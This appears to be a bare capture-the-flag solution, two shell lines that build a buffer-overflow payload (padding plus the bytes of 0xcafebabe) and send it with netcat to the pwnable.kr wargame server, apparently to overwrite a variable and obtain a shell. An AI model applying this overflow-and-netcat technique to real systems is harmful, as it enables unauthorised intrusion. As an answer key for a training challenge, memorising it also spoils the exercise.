echo -ne 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMM\xbe\xba\xfe\xca' > input
(cat input; cat) | nc pwnable.kr 9000
